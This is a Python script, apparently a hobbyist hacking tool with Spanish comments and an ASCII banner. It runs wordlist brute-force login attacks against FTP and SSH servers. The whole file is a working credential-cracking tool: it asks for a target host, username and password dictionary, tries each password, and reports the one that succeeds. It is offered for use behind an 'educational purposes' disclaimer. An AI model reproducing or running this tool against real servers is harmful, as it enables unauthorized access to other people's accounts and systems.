#!/usr/bin/env python3

#Creando un cracker para multiples servicios.
#By Blackster. All Rights Reserved 2021.

#importamos los modulos necesarios.
from colorama import Fore, init
import paramiko
import ftplib
import os

#creamos nuestra variable para nuestro banner.
banner = """
 ███▄ ▄███▓ ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
▓██▒▀█▀ ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒
▓██    ▓██░▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░
▒██    ▒██ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄
▒██▒   ░██▒▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░ ▒░   ░  ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
░  ░      ░  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
░      ░   ░          ░░   ░   ░   ▒   ░        ░ ░░ ░
       ░   ░ ░         ░           ░  ░░ ░      ░  ░
           ░                           ░

           By Blackster
"""


def menu():
    """ funcion para nuestro menu """
    os.system('clear')
    print(Fore.GREEN)
    print(banner)
    print(Fore.CYAN)
    print("\n[*]Esta herramienta fue creada para fines educativos, por lo tanto no me hago responsable del mal uso que puedan darle.")
    Menu = """
    //////+ Menu +//////

1--> Crackear FTP.
2--> Crackear SSH.

99-->Salir.
    """
    print(Fore.RED)
    print(Menu)


#creando las clases para cada tipo de ataque.
class FTP:
    def __init__(self):
        self.server = input("Introduce la direccion del servidor FTP >> ")
        self.user = input("Introduce el nombre de usuario para el servidor >> ")
        self.passwd = input("Introduce la ruta del diccionario >> ")
        with open(self.passwd, "r") as pw:
            for password in pw:
                password = password.strip('\r').strip('\n')
                try:
                    """ probamos establecer el login """
                    self.ftp = ftplib.FTP(self.server)
                    self.ftp.login(self.user, password)
                    print(Fore.GREEN)
                    print("[*]Crackeado!! la contraseña es --> " + password)
                    input("\nPresiona enter para continuar..")
                    break;
                except:
                    print(Fore.YELLOW)
                    print("[*]No crackeado!! Probando: " + self.user + ":" + password)

class SSH:
    def __init__(self):
        """ Funcion que toma el input del usuario y los pasa a cada argumento """

        self.server = input("Introduce la direccion del servidor SSH >> ")
        self.user = input("Introuduce el nombre de usuario para el servidor >> ")
        self.passwd = input("Introduce aqui la ruta del diccionario >> ")
        #abrir el diccionario proporcionado por el usuario y leerlo.
        with open(self.passwd, "r") as pw:
            for password in pw:
                password = password.strip(' \r').strip('\n')
                try:
                    """ probamos a establecer la conexion ssh """
                    self.ssh = paramiko.SSHClient()
                    self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    self.ssh.connect(self.server, username=self.user, password=password)
                    print(Fore.CYAN)
                    print("[*]Servidor Crackeado!! la contraseña es --> " + password)
                except:
                    """ Excepcion en caso de no crackear la contraseña """
                    print(Fore.MAGENTA)
                    print("[*]No crackeado!! Probando: " + self.user + ":" + password)

if __name__ == '__main__':
    while True:
        menu()
        ask = int(input("Escoge una opcion >> "))
        if ask == 1:
            #crea un objeto y llama a la clase FTP.
            ftp = FTP()
        elif ask == 2:
            #crea un objeto y llama a la clase SSH.
            ssh = SSH()
        else:
            if aks == 99:
                print("See You...")
                break
